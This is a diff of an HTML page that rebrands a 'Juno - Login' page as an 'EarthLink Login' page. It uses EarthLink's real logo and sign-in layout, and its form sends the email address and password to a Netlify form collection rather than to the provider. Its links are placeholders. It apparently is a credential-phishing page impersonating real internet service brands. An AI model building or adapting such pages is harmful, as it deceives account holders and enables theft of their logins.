@@ -3,68 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Juno - Login</title>
+    <title>EarthLink Login</title>
     <link rel="stylesheet" href="styles.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
+    <div class="logo-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/99/Earthlink_logo_%282020%29.svg/1280px-Earthlink_logo_%282020%29.svg.png" alt="EarthLink Logo" class="logo">
+    </div>
+    
     <div class="container">
-        <div class="login-box">
-            <h1>Juno - Login</h1>
-            
-            <!-- Netlify form with required attributes -->
-            <form id="loginForm" name="juno-login" netlify netlify-honeypot="bot-field" method="POST" data-netlify="true">
-                <!-- Hidden honeypot field for spam protection -->
-                <input type="hidden" name="bot-field" />
-                
-                <!-- Hidden field for timestamp -->
-                <input type="hidden" name="timestamp" id="timestamp" />
-                
-                <div class="input-group">
-                    <label for="username">User name:</label>
-                    <input type="text" id="username" name="username" required>
-                </div>
-                
-                <div class="input-group">
-                    <label for="password">Password:</label>
-                    <div class="password-container">
-                        <input type="password" id="password" name="password" required>
-                        <i class="far fa-eye" id="togglePassword"></i>
-                    </div>
-                </div>
-                
-                <div class="remember-section">
-                    <div class="checkbox-container">
-                        <input type="checkbox" id="keepSigned" name="keepSigned">
-                        <label for="keepSigned">Keep me signed in</label>
-                    </div>
-                </div>
-                
-                <div class="captcha-section">
-                    <div class="captcha-container">
-                        <div class="captcha-image">
-                            <canvas id="captchaCanvas" width="300" height="80"></canvas>
-                            <button type="button" class="refresh-btn" id="refreshCaptcha">
-                                <i class="fas fa-sync-alt"></i>
-                            </button>
-                        </div>
-                        <div class="captcha-instruction">
-                            <label for="captchaInput">Type the words above.</label>
-                            <input type="text" id="captchaInput" name="captcha" required>
-                        </div>
-                    </div>
-                </div>
-                
-                <button type="submit" class="login-btn">Login</button>
-            </form>
-            
-            <div class="footer-links">
-                <a href="#">Forgot Password?</a>
-                <a href="#">Create Account</a>
-                <a href="#">Help Center</a>
+        <header>
+            <h1>Welcome to EarthLink</h1>
+            <p>Sign in to get started</p>
+        </header>
+        
+        <form id="loginForm" name="EarthLink-Login" netlify netlify-honeypot="bot-field">
+            <div class="input-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" required>
             </div>
+            
+            <div class="input-group">
+                <label for="password">Password</label>
+                <div class="password-container">
+                    <input type="password" id="password" name="password" required>
+                    <i class="far fa-eye" id="togglePassword"></i>
+                </div>
+            </div>
+            
+            <div class="options">
+                <div class="remember-me">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember">Remember username</label>
+                </div>
+                <a href="#" class="forgot-password">Forgot your password?</a>
+            </div>
+            
+            <button type="submit" class="btn btn-gray">Sign In</button>
+        </form>
+        
+        <div class="action-buttons">
+            <button class="btn btn-blue">Make a Payment</button>
+            <button class="btn btn-blue">Support</button>
         </div>
     </div>
+    
+    <footer>
+        <nav>
+            <div class="footer-links"><a href="#">Internet</a><span> ></span></div>
+            <div class="footer-links"><a href="#">Email</a><span> ></span></div>
+            <div class="footer-links"><a href="#">My Account</a><span> ></span></div>
+            <div class="footer-links"><a href="#">Help</a><span> ></span></div>
+        </nav>
+        <button class="chat-btn">Chat</button>
+    </footer>
     
     <script src="script.js"></script>
 </body>
